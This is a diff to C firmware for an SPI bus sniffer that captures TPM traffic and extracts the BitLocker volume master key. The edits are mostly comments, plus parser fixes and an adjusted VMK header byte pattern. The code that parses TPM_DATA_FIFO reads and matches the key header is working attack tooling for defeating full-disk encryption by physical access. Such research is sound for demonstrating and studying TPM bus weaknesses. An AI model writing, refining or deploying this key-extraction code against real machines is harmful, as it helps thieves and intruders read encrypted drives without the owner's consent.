@@ -30,10 +30,12 @@
 
 // number of buffers for a given signal.
 // each buffer is serviced by a dedicated DMA channel.
+// we only have 12 DMA channels available.
 #define BUFFERS_PER_SIGNAL 6
 _Static_assert(BUFFERS_PER_SIGNAL >= 2 && BUFFERS_PER_SIGNAL <= 6, "BUFFERS_PER_SIGNAL must be in range [2, 6]");
 
 // length of each buffer as a power of 2.
+// see "channel_config_set_ring" documentation for more details.
 #define BUFFER_LENGTH_POWER 14
 _Static_assert(BUFFER_LENGTH_POWER >= 1 && BUFFER_LENGTH_POWER <= 15, "BUFFER_LENGTH_POWER must be in range [1, 15]");
 
@@ -43,7 +45,7 @@ _Static_assert(BUFFER_LENGTH_POWER >= 1 && BUFFER_LENGTH_POWER <= 15, "BUFFER_LE
 // amount of data the SPI sniffer must receive before auto-pushing them into the RX FIFO.
 // the TPM data that we're interested in is transmitted as 8-bit bytes.
 #define AUTOPUSH_THRESHOLD_BYTES 1
-#define AUTOPUSH_THRESHOLD_BITS AUTOPUSH_THRESHOLD_BYTES * 8
+#define AUTOPUSH_THRESHOLD_BITS (AUTOPUSH_THRESHOLD_BYTES * 8)
 
 // base GPIO pin for the PIO state machines.
 // note that CLK and CS are defined as fixed GPIO pins in "snuffer.pio"
@@ -144,26 +146,29 @@ static inline uint8_t get_current_miso_byte() {
 
 // parse captured SPI data for TPM transactions that are known to contain VMK data.
 // we only care about the TPM host reading from address 0xD40024 (TPM_DATA_FIFO_0).
-// according to the ST33TPHF2XSPI datasheet, those transactions have the following structure.
+// according to the "TCG PC Client Platform TPM Profile Specification for TPM 2.0",
+// transactions should have roughly the following structure.
+// this is an approximation since we're representing data as bytes instead of individual bits.
 //
 //     read    data length - 1
 //         \  /  ,- address --,    ,------- garbage --------,
 //          ||  /              \  /                          \
 // MOSI:  0x82, 0xD4, 0x00, 0x24, 0x??, 0x??, 0x??, 0x??, 0x??
-// MISO:  0x??, 0x??, 0x??, 0x00, 0x00, 0x01, 0x??, 0x??, 0x??
-//        \              /  \        /  \  /  \              /
-//         '- garbage --'   waits >= 1  ack    '--- data ---'
+// MISO:  0x??, 0x??, 0x??, 0x?0, 0x00, 0x01, 0x??, 0x??, 0x??
+//        \                   /\          /|  \              /
+//         '---- garbage ----'  waits >= 1  \  '--- data ---'
+//                                           ack
 //
-// this parser is designed to handle that structure
-// but in testing, all relevant transactions looked exactly like this.
+// for reference, all relevant transactions looked exactly like this during testing.
 //
 //     read    data length 0 -> 1 byte.
 //         \  /  ,- address --,             
 //          ||  /              \            
 // MOSI:  0x80, 0xD4, 0x00, 0x24, 0x00, 0x00
 // MISO:  0x80, 0x00, 0x00, 0x00, 0x01, 0x??
-//                          \  /  \  /  \  /
-//                          wait  ack   data
+//                             \    /|  \  /
+//                              wait  \ data
+//                                     ack
 //
 // see also:
 //      advance_to_next_capture_blocking
@@ -217,16 +222,9 @@ static inline void parse_tpm_transactions() {
 
         // the TPM host is trying to read address 0xD40024 (TPM_DATA_FIFO_0).
 
-        // at this point, the TPM should have already sent 1 wait byte.
-        if(get_current_miso_byte() != TPM_WAIT) {
-            // found unexpected byte. reset the parser.
-            continue;
-        }
-
-        // if the TPM isn't ready yet then it may respond with more wait bytes.
-        // the ST33TPHF2XSPI datasheet suggests that this is only the case for write requests
-        // and additional wait bytes were not seen during testing.
-        // we'll check for them anyway.
+        // if the TPM isn't ready yet then it may respond with 1 or more wait bytes.
+        // wait bytes technically aren't aligned to the 8-bit boundaries we're working with
+        // but the structure of the TPM SPI bit protocol and flow control allows us to treat them as if they are.
         do {
             advance_to_next_capture_blocking();
         } while(get_current_miso_byte() == TPM_WAIT);
@@ -254,28 +252,56 @@ static inline void parse_tpm_transactions() {
 // look for a known byte sequence that precedes the volume master key (VMK).
 // print the VMK if/when it's found.
 // see also:
-//      handle_tpm_state_ack
 //      parse_tpm_transactions
 void core1_dump_vmk() {
-    // this regular expression
-    // 2c000[0-6]000[1-9]000[0-1]000[0-5]200000(\w{64})
-    // is borrowed from the "BitLocker-Key-Extractor" plugin found here
-    // https://github.com/ReversecLabs/bitlocker-spi-toolkit
-    // and is expressed here as pairs of inclusive upper and lower limits for VMK header bytes.
+    // the following header data is based on a regular expression borrowed from the bitlocker-spi-toolkit project
+    // and the FVE metadata entry documented by the libbde project.
+    // expected values are expressed here as pairs of inclusive upper and lower limits.
+    // https://github.com/ReversecLabs/bitlocker-spi-toolkit/blob/main/BitLocker-Key-Extractor/HighLevelAnalyzer.py
+    // https://github.com/libyal/libbde/blob/main/documentation/BitLocker%20Drive%20Encryption%20(BDE)%20format.asciidoc#53-fve-metadata-entry
     const uint8_t vmk_header[][2] = {
+        // entry size.
+        // 0x000C header bytes.
+        // 0x0020 data bytes.
+        // 0x002c total bytes.
         {0x2c, 0x2c},
         {0x00, 0x00},
+
+        // entry type.
+        // 0x0000 = None, entry is a property
+        // 0x0002 = Volume Master Key (VMK)
+        // 0x0003 = Full Volume Encryption Key (FVEK)
+        // 0x0004 = Validation
+        // 0x0006 = Startup key
         {0x06, 0x00},
         {0x00, 0x00},
+
+        // value type.
+        // 0x0001 = Key
+        // 0x0002 = Unicode string (UTF-16 little-endian with end of string character)
+        // 0x0003 = Stretch Key
+        // 0x0004 = Use Key
+        // 0x0005 = AES-CCM encrypted key
+        // 0x0006 = TPM encoded key
+        // 0x0007 = Validation
+        // 0x0008 = Volume master key
+        // 0x0009 = External key
         {0x09, 0x01},
         {0x00, 0x00},
-        {0x01, 0x00},
+
+        // version.
+        // 0x0001 and 0x0003 seen.
+        {0x03, 0x00},
         {0x00, 0x00},
+
+        // encryption method.
+        // 0x00002000 to 0x00002005 = AES-CCM 256 bit encryption?
         {0x05, 0x00},
         {0x20, 0x20},
         {0x00, 0x00},
         {0x00, 0x00},
     };
+
 
     char vmk_hex_string[VMK_LENGTH_HEX + 1];
     uint8_t vmk_buffer[VMK_LENGTH_BYTES];
@@ -294,7 +320,7 @@ void core1_dump_vmk() {
             }
             else if(index) {
                 // a byte failed to match partway through the sequence.
-                // return to the start of the sequence.
+                // return to the start of the sequence and check it again.
                 index = 0;
                 continue;
             }
